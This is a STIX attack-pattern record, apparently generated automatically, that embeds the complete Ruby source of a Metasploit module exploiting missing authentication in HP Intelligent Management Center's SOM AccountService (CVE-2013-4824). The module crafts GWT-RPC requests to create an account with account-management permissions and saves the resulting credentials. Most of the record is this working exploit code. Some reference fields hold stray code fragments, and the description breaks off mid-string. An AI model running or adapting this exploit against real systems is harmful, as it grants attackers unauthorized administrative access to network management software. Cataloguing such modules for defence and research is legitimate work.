{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68e645da-17e7-4b0b-b291-408f488ebc93",
    "created": "2024-08-14T16:22:41.59326Z",
    "modified": "2024-08-14T16:22:41.593264Z",
    "name": "HP Intelligent Management SOM Account Creation",
    "description": " This module exploits a lack of authentication and access control in HP Intelligent Management, specifically in the AccountService RpcServiceServlet from the SOM component in order to create a SOM account with Account Management permissions. This module has been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/hp/hp_imc_som_create_account.rb",
            "external_id": "hp_imc_som_create_account.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-c03943547"
        },
        {
            "source_name": "\"http://localhost:8080/servicedesk/servicedesk/\"",
            "external_id": "#1servletURL"
        },
        {
            "source_name": "\"1\"",
            "external_id": "#servletURL"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Intelligent Management SOM Account Creation',\n      'Description'    => %q{\n        This module exploits a lack of authentication and access control in HP Intelligent\n        Management, specifically in the AccountService RpcServiceServlet from the SOM component,\n        in order to create a SOM account with Account Management permissions. This module has\n        been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with\n        SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2013-4824' ],\n          [ 'OSVDB', '98249' ],\n          [ 'BID', '62902' ],\n          [ 'ZDI', '13-240' ],\n          [ 'URL', 'https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-c03943547' ]\n        ],\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-10-08'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('USERNAME', [true, 'Username for the new account', 'msf']),\n        OptString.new('PASSWORD', [true, 'Password for the new account', 'p4ssw0rd'])\n      ])\n  end\n\n  def get_service_desk_strong_name\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"servicedesk\", \"servicedesk\", \"servicedesk.nocache.js\"),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /unflattenKeylistIntoAnswers\\(\\['default', 'safari'\\], '([0-9A-Fa-f]+)'\\);/\n      return $1\n    end\n\n    return nil\n  end\n\n  def get_account_service_strong_name(service_desk)\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"servicedesk\", \"servicedesk\", \"#{service_desk}.cache.html\"),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /'accountSerivce.gwtsvc', '([0-9A-Fa-f]+)', SERIALIZER_1/\n      return $1\n    end\n\n    return nil\n  end\n\n  def run\n\n    print_status(\"Trying to find the service desk service strong name...\")\n    service_desk = get_service_desk_strong_name\n    if service_desk.nil?\n      print_error(\"service desk service not found.\")\n      return\n    end\n    print_good(\"service desk strong number found: #{service_desk}\")\n\n    print_status(\"Trying to find the AccountService strong name...\")\n    account_service = get_account_service_strong_name(service_desk)\n    if account_service.nil?\n      print_error(\"AccountService service not found.\")\n      return\n    end\n    print_good(\"AccountService strong number found: #{account_service}\")\n\n    header= \"6|0|39\" # version | unknown | string_table size\n\n    # Used to parse the payload\n    string_table = [\n      \"http://localhost:8080/servicedesk/servicedesk/\",                         # 1  servlet URL\n      \"#{account_service}\",                                                     # 2  AccountService strong name\n      \"com.h3c.imc.eu.client.account.AccountService\",                           # 3  GWT Service Class\n      \"addAccount\",                                                             # 4  GWT Service Method\n      \"com.extjs.gxt.ui.client.data.BaseModelData/3541881726\",                  # 5  BaseModelData Type\n      \"com.extjs.gxt.ui.client.data.RpcMap/3441186752\",                         # 6  RpcMap Type\n      \"isAccount\",                                                              # 7  isAccount Field\n      \"java.lang.Boolean/476441737\",                                            # 8  Boolean Type\n      \"ssName\",                                                                 # 9  ssName Field\n      \"java.lang.String/2004016611\",                                            # 10 String Type\n      datastore[\"USERNAME\"],                                                    # 11 ssName Value\n      \"authType\",                                                               # 12 authType Field\n      \"java.lang.Integer/3438268394\",                                           # 13 Integer Type\n      \"ssPassword\",                                                             # 14 ssPassword Field\n      datastore[\"PASSWORD\"],                                                    # 15 ssPassword value\n      \"accountGroups\",                                                          # 16 accountGroups Field\n      \"java.util.ArrayList/3821976829\",                                         # 17 ArayList Type\n      \"permissions\",                                                            # 18 permissions Field\n      \"iMC-SOM-SERVICEDESK\",                                                    # 19 permissions Value\n      \"iMC-SOM-SERVICEDESK.PROCTASK\",                                           # 20 permissions Value\n      \"iMC-SOM-SERVICEDESK.ACCT\",                                               # 21 permissions Value\n      \"iMC-SOM-SERVICEDESK.ACCT.VIEW\",                                          # 22 permissions Value\n      \"iMC-SOM-SERVICEDESK.ACCT.ADD\",                                           # 23 permissions Value\n      \"iMC-SOM-SERVICEDESK.ACCT.MOD\",                                           # 24 permissions Value\n      \"iMC-SOM-SERVICEDESK.ACCT.DEL\",                                           # 25 permissions Value\n      \"userName\",                                                               # 26 userName Field\n      \"certification\",                                                          # 27 certification Field\n      \"userGroupId\",                                                            # 28 userGroupId Field\n      \"java.lang.Long/4227064769\",                                              # 29 Long Type\n      \"userGroupName\",                                                          # 30 userGroupName Field\n      \"Ungrouped\",                                                              # 31 userGroupName Value\n      \"userGroupDescription\",                                                   # 32 userGroupDescription Field\n      \"Ungrouped User.This record is generated by system, can not be deleted.\", # 33 userGroupDescription Value\n      \"address\",                                                                # 34 address Field\n      \"\",                                                                       # 35 address Value\n      \"phone\",                                                                  # 36 phone Field\n      \"email\",                                                                  # 37 email Field\n      \"userAppendInfo\",                                                         # 38 userAppendInfo Field\n      \"java.util.HashMap/962170901\"                                             # 39 HashMap Type\n    ].join(\"|\")\n\n    payload = [\n      \"1\",  # servlet URL\n      \"2\",  # strong name\n      \"3\",  # GWT Service Class\n      \"4\",  # GWT Service Method (addAccount)\n      \"1\",  # number of method parameters (addAccount has 1 parameter)\n      \"5\",  # parameter type (BaseModelData)\n      \"5\",  # read BaseModelData\n      \"1\",  # read 1 object into the BaseModelData\n      \"6\",  # read RpcMap\n      \"15\", # read 15 objects into the RpcMap\n      \"7\",  # RpcMap[0] => isAccount\n      \"8\",  # isAccount Type (Boolean)\n      \"1\",  # isAccount Value (true)\n      \"9\",  # RpcMap[1] => ssName\n      \"10\", # ssName Type (String)\n      \"11\", # ssName Value\n      \"12\", # RpcMap[2] => authType\n      \"13\", # authType Type\n      \"0\",  # authType Value (0 => password)\n      \"14\", # RpcMap[3] => ssPassword\n      \"10\", # ssPassword Type (String)\n      \"15\", # ssPassword Value\n      \"16\", # RpcMap[4] => accountGroups\n      \"17\", # accountGroups Type (ArrayList)\n      \"0\",  # accountGroups size (0)\n      \"18\", # RpcMap[5] => permissions\n      \"17\", # permissions Type (ArrayList)\n      \"7\",  # permissions size (7)\n      \"10\", # permissions[0] Type (String)\n      \"19\", # permissions[0] Value (iMC-SOM-SERVICEDESK)\n      \"10\", # permissions[1] Type (String)\n      \"20\", # permissions[1] Value (iMC-SOM-SERVICEDESK.PROCTASK)\n      \"10\", # permissions[2] Type (String)\n      \"21\", # permissions[2] Value (iMC-SOM-SERVICEDESK.ACCT)\n      \"10\", # permissions[3] Type (String)\n      \"22\", # permissions[3] Value (iMC-SOM-SERVICEDESK.ACCT.VIEW)\n      \"10\", # permissions[4] Type (String)\n      \"23\", # permissions[4] Value (iMC-SOM-SERVICEDESK.ACCT.ADD)\n      \"10\", # permissions[5] Type (String)\n      \"24\", # permissions[5] Value (iMC-SOM-SERVICEDESK.ACCT.MOD)\n      \"10\", # permissions[6] Type (String)\n      \"25\", # permissions[6] Value (iMC-SOM-SERVICEDESK.ACCT.DEL)\n      \"26\", # RpcMap[6] => username\n      \"-4\", # username Type - not provided\n      \"27\", # RpcMap[7] => certification\n      \"-4\", # certification Type - not provided\n      \"28\", # RpcMap[8] => userGroupId\n      \"29\", # userGroupId Type (Long)\n      \"B\",  # userGroupId Value - not provided\n      \"30\", # RpcMap[9] => userGroupName\n      \"10\", # userGroupName Type (String)\n      \"31\", # userGroupName Value (Ungrouped)\n      \"32\", # RpcMap[10] => userGroupDescription\n      \"10\", # userGroupDescription Type (String)\n      \"33\", # userGroupDescription Value (Ungrouped User.This record is generated by system, can not be deleted.)\n      \"34\", # RpcMap[11] => address\n      \"10\", # address Type (String)\n      \"35\", # address Value (\"\")\n      \"36\", # RpcMap[12] => phone\n      \"-19\",# phone Type - not provided\n      \"37\", # RpcMap[13] => email\n      \"-19\",# email Type - not provided\n      \"38\", # RpcMap[14] => userAppendInfo\n      \"39\", # userAppendInfo Type (HashMap)\n      \"0\"   # userAppendInfo HashMap size (0)\n    ].join(\"|\")\n\n    gwt_request = [header, string_table, payload].join(\"|\")\n    gwt_request << \"|\" # end\n\n    service_url = ssl ? \"https://\" : \"http://\"\n    service_url << \"#{rhost}:#{rport}/servicedesk/servicedesk/\"\n\n    print_status(\"Trying to create account #{datastore[\"USERNAME\"]}...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(\"servicedesk\", \"servicedesk\", \"accountSerivce.gwtsvc\"),\n      'ctype'  => 'text/x-gwt-rpc; charset=UTF-8',\n      'headers' => {\n        \"X-GWT-Module-Base\" => service_url,\n        \"X-GWT-Permutation\" => \"#{service_desk}\"\n      },\n      'data'   => gwt_request\n    })\n\n    unless res and res.code == 200\n      print_error(\"Unknown error while creating the user.\")\n      return\n    end\n\n    if res.body =~ /Username.*already exists/\n      print_error(\"The user #{datastore[\"USERNAME\"]} already exists.\")\n      return\n    elsif res.body =~ /Account.*added successfully/\n      login_url = ssl ? \"https://\" : \"http://\"\n      login_url << \"#{rhost}:#{rport}/servicedesk/ServiceDesk.jsp\"\n\n      connection_details = {\n          module_fullname: self.fullname,\n          username: datastore['USERNAME'],\n          private_data: datastore['PASSWORD'],\n          private_type: :password,\n          workspace_id: myworkspace_id,\n          proof: \"#{login_url}\\n#{res.body}\",\n          status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n\n      print_good(\"Account #{datastore[\"USERNAME\"]}/#{datastore[\"PASSWORD\"]} created successfully.\")\n      print_status(\"Use it to log into #{login_url}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-10-08"
}